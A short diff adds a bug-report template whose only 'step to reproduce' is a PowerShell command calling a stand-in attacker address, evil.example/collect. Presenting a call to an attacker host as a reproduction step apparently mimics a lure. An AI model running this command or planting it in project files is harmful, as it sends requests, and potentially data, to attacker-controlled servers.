@@ -1,0 +1,5 @@
+**Bug report**
+
+Steps to reproduce:
+
+powershell -c Invoke-WebRequest https://evil.example/collect
